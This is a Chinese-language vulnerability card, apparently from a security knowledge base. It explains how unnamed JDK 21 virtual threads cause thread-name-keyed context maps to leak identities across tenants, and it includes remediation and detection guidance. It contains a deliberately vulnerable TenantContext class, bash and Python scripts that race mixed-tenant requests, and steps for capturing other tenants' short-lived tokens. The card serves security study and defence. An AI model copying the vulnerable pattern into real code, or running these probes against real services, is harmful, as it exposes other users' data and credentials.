---
id: web-java-framework-virtual-thread-empty-name-context-crosstalk
title: JDK 21 虚拟线程默认空名导致以线程名为键的上下文串扰与跨租户越权
type: scenario
domain: web
path: web/java/framework
technique: virtual-thread-empty-name-context-crosstalk
tags:
- java
- jdk21
- virtual-threads
- concurrency
- context
- cross-tenant
- authz
- session
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:36:59+08:00'
  notes: 已对照原文与14张图核对；空名虚拟线程/threadId 唯一/并发错配 22/200、24/50、54/500 与截图一致；JDK21/Tomcat10.1.10/SpringBoot3.2 为目标环境而非组件受影响版本，已 clear；原文修复段删除了 bind() 导致 correct=0，卡片已如实标注；未复现
url: /docs/web/java/framework/web-java-framework-virtual-thread-empty-name-context-crosstalk/
draft: false
kb_aliases:
- 虚拟线程会话串扰
- 线程名 Map 串扰
- Thread.getName 返回空串
- 跨租户上下文泄漏
- JDK 21 虚拟线程漏洞
---

## 一句话结论

JDK 21 用 `Thread.ofVirtual()`/`Executors.newVirtualThreadPerTaskExecutor()` 创建且未命名的虚拟线程，`Thread.getName()` 默认返回空串 `""`；若业务或中间件用线程名作为 `ConcurrentHashMap` 的键保存租户/会话/MDC 上下文，所有虚拟线程会退化为共享同一个 `""` 条目，并发请求之间互相覆盖、读到对方的身份，形成跨租户越权。

## 原理

平台线程时代，`http-nio-8080-exec-1` 这类线程名在一次请求生命周期内稳定且唯一，大量代码据此把“线程名”当成“请求/会话身份”：

```java
private static final ConcurrentHashMap<String, String> TABLE = new ConcurrentHashMap<>();
TABLE.put(Thread.currentThread().getName(), tenantId);
```

JDK 21 的虚拟线程改变了这个隐含契约：

- `Thread.ofVirtual().unstarted(...)` 和 `Executors.newVirtualThreadPerTaskExecutor()` 创建的虚拟线程，未显式命名时 `getName()` 返回空串；
- `Thread.threadId()` 仍然唯一（64 个并发虚拟线程得到 64 个不同 ID），但 `getName()` 只有 1 个唯一值（`""`）；
- 因此以 `getName()` 为键的静态 Map 从“按线程隔离”退化为“全局共享一条记录”。

并发时的交错过程：

1. 请求 A 的虚拟线程执行 `bind("A")`，写入 `TABLE[""]="A"`；
2. 该线程执行 `Thread.sleep`/I/O，JVM 挂起它并调度其他虚拟线程；
3. 请求 B 的虚拟线程执行 `bind("B")`，覆盖 `TABLE[""]="B"`；
4. A 唤醒后 `current()` 读到 `"B"`，把自己的响应渲染成 B 的身份。

只要“绑定”和“读取”之间发生阻塞/让出，就会形成竞争窗口。Tomcat 10.1.10+ 的虚拟线程执行器、Spring Boot 3.2 的 `spring.threads.virtual.enabled=true` 都直接使用未命名虚拟线程，扩大了这种代码模式的暴露面。

## 触发条件

- 运行在 JDK 21+，Web 容器/框架启用了虚拟线程执行器（Tomcat 10.1.10+、Spring Boot 3.2+，或应用自建 `newVirtualThreadPerTaskExecutor`）；
- 业务代码或第三方库（多租户中间件、MDC/日志桥、APM 探针、按线程分片的限流器/数据源路由）用 `Thread.currentThread().getName()` 作为 Map 键保存上下文；
- 上下文绑定与读取之间存在阻塞、I/O 或 `Thread.sleep`，允许其他虚拟线程插入；
- 多租户/多用户并发请求可被攻击者控制（至少能控制自己的请求头/参数）。

## 利用步骤

1. 确认目标启用虚拟线程：`jcmd <pid> Thread.dump_to_file` 中可见 `virtual` 线程且名字为空串；或从框架版本/配置推断。
2. 静态扫描代码或依赖中的 `Thread.getName()` → `Map.put/get/remove` 模式（可用 `javap -c` + 正则）。
3. 构造并发请求：一组带 `X-Tenant: A`，一组带 `X-Tenant: B`，在请求中加延迟参数放大窗口。
4. 观察响应中的实际身份与请求声称的身份是否错配；错配即证明串扰。
5. 若响应包含预签 URL、STS Token、CSRF Token 等短期凭据，捕获后可在有效期内以受害者身份继续请求，把读越权升级为写越权。

## PoC

存在漏洞的上下文实现：

```java
public final class TenantContext {
    private static final ConcurrentHashMap<String, String> TABLE = new ConcurrentHashMap<>();
    public static void bind(String tenantId) {
        TABLE.put(Thread.currentThread().getName(), tenantId);
    }
    public static String current() {
        return TABLE.get(Thread.currentThread().getName());
    }
    public static void unbind() {
        TABLE.remove(Thread.currentThread().getName());
    }
}
```

并发验证脚本（核心逻辑）：

```bash
ENDPOINT="http://127.0.0.1:8080/order?delayMs=50"
for i in $(seq 1 200); do
  if (( i % 2 == 0 )); then T=A; else T=B; fi
  ( BODY=$(curl -s -H "X-Tenant: $T" "$ENDPOINT")
    echo "sent=$T body=$BODY" >> raw.log ) &
done
wait
grep -E 'sent=A body=.*"viewedAs":"B"|sent=B body=.*"viewedAs":"A"' raw.log | head
```

Python 并发探测（观察 500 次请求中有多少返回了他人租户）：

```python
import concurrent.futures, re, urllib.request

URL, MY = "http://127.0.0.1:8080/order?delayMs=80", "A"

def probe(_):
    req = urllib.request.Request(URL, headers={"X-Tenant": MY})
    try:
        body = urllib.request.urlopen(req, timeout=5).read().decode()
        m = re.search(r'"viewedAs":"([^"]+)"', body)
        return m.group(1) if m else None
    except Exception:
        return None

with concurrent.futures.ThreadPoolExecutor(max_workers=64) as pool:
    results = list(pool.map(probe, range(500)))

leaked = [r for r in results if r and r != MY and r != "null"]
print(len(leaked), "/", len(results), "leaked:", set(leaked))
```

原文实测中错配稳定出现（示例 200 次请求中 22 次错配；另一次 50 对请求中 24 处越权；Python 探测 54/500 泄漏）。访问日志每行都是 200、约 20 字节、50ms，完全看不出身份错配。

## 变体与关联

- 变体：MDC/日志上下文按线程名存放导致日志串号；APM traceId 按线程名绑定；按线程名选择数据库分片/租户数据源；按线程名做限流计数。
- 变体：`ThreadLocal` 本身仍按线程隔离，不会串扰；问题只在“用线程名做全局 Map 键”或“线程池复用 + 未清理”的代码。
- 关联：[[web-java-framework-do-filter-reflection-dispatch]]（同一 Java Web 栈的其他架构缺陷）；[[web-generic-auth-servlet-null-role-fail-open]]（鉴权上下文缺陷）。
- 不确定点：原文演示应用是自建的，依赖“业务代码用线程名做键”这一前提；真实产品是否命中需按代码/依赖确认。原文的“修复后”脚本把 `bind()` 调用也删掉了，出现 `correct=0/mismatch=0`（响应为 null），不能作为隔离修复的完整证明；正确修复应保留绑定逻辑并显式命名线程。

## 检测与防御

- **修复**：改用 `ThreadLocal`/`ScopedValue`/请求作用域对象保存上下文；禁止用线程名作为身份键。若必须命名，使用 `Thread.ofVirtual().name("prefix-", 0).factory()` 并配合 `newThreadPerTaskExecutor`，同时保留 bind/unbind。
- **静态扫描**：CI 中扫描字节码/源码里 `Thread.getName()` 后紧跟 `Map.put/get/remove` 的模式；重点检查第三方多租户、日志、APM 依赖。
- **测试**：在启用虚拟线程的集成测试中并发发送不同租户请求，断言响应身份始终与请求身份一致；不要只做单请求测试。
- **运行时**：`Thread.dump_to_file` 检查虚拟线程命名；对空名虚拟线程占比做监控；访问日志增加实际业务身份字段（而非仅记录请求头）。
- **纵深防御**：即使上下文串扰，响应也应按服务端会话重新校验租户权限；敏感凭据（STS/预签 URL）绑定到会话而非仅依赖上下文对象。
